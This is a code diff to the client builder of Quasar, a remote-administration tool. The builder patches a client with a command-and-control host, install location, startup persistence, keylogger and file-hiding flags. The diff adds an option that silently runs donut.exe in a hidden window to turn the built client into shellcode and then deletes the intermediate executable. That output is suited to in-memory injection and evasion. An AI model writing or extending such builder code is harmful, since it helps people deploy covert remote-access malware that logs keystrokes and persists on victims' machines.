@@ -3,6 +3,8 @@ using Mono.Cecil.Cil;
 using Quasar.Common.Cryptography;
 using Quasar.Server.Models;
 using System;
+using System.Diagnostics;
+using System.IO;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
@@ -41,7 +43,28 @@ namespace Quasar.Server.Build
                     throw new Exception("renaming failed");
 
                 // PHASE 3 - Saving
-                r.AsmDef.Write(_options.OutputPath);
+                if (_options.GenerateShellcode == false)
+                {
+                    r.AsmDef.Write(_options.OutputPath);
+                }
+                else
+                {
+                    r.AsmDef.Write(_options.OutputPath + ".exe");
+                }
+
+                // PHASE 4 - Encoding
+                if (_options.GenerateShellcode)
+                {
+                    var info = new ProcessStartInfo();
+                    info.FileName = "utils\\donut.exe";
+                    info.Arguments = $" -c Program -m Main --input:{_options.OutputPath + ".exe"} --output:{_options.OutputPath}";
+                    info.CreateNoWindow = true;
+                    info.WindowStyle = ProcessWindowStyle.Hidden;
+
+                    var donut = Process.Start(info);
+                    donut.WaitForExit();
+                    File.Delete(_options.OutputPath + ".exe");
+                }
             }
 
             // PHASE 4 - Assembly Information changing
@@ -54,7 +77,7 @@ namespace Quasar.Server.Build
                 versionResource.ProductVersion = _options.AssemblyInformation[6];
                 versionResource.Language = 0;
 
-                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
+                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                 stringFileInfo["CompanyName"] = _options.AssemblyInformation[2];
                 stringFileInfo["FileDescription"] = _options.AssemblyInformation[1];
                 stringFileInfo["ProductName"] = _options.AssemblyInformation[0];
@@ -88,7 +111,7 @@ namespace Quasar.Server.Build
 
             byte[] signature;
             // https://stackoverflow.com/a/49777672 RSACryptoServiceProvider must be changed with .NET 4.6
-            using (var csp = (RSACryptoServiceProvider) caCertificate.PrivateKey)
+            using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
             {
                 var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                 signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
@@ -113,33 +136,43 @@ namespace Quasar.Server.Build
                                         case 1: //version
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Version);
                                             break;
+
                                         case 2: //ip/hostname
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.RawHosts);
                                             break;
+
                                         case 3: //installsub
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallSub);
                                             break;
+
                                         case 4: //installname
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallName);
                                             break;
+
                                         case 5: //mutex
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Mutex);
                                             break;
+
                                         case 6: //startupkey
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.StartupName);
                                             break;
+
                                         case 7: //encryption key
                                             methodDef.Body.Instructions[i].Operand = key;
                                             break;
+
                                         case 8: //tag
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Tag);
                                             break;
+
                                         case 9: //LogDirectoryName
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.LogDirectoryName);
                                             break;
+
                                         case 10: //ServerSignature
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
                                             break;
+
                                         case 11: //ServerCertificate
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
                                             break;
@@ -154,21 +187,27 @@ namespace Quasar.Server.Build
                                         case 1: //install
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Install));
                                             break;
+
                                         case 2: //startup
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Startup));
                                             break;
+
                                         case 3: //hidefile
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideFile));
                                             break;
+
                                         case 4: //Keylogger
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Keylogger));
                                             break;
+
                                         case 5: //HideLogDirectory
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideLogDirectory));
                                             break;
+
                                         case 6: // HideInstallSubdirectory
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
                                             break;
+
                                         case 7: // UnattendedMode
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.UnattendedMode));
                                             break;
@@ -213,10 +252,13 @@ namespace Quasar.Server.Build
             {
                 case 1:
                     return (sbyte)Environment.SpecialFolder.ApplicationData;
+
                 case 2:
                     return (sbyte)Environment.SpecialFolder.ProgramFiles;
+
                 case 3:
                     return (sbyte)Environment.SpecialFolder.System;
+
                 default:
                     throw new ArgumentException("InstallPath");
             }
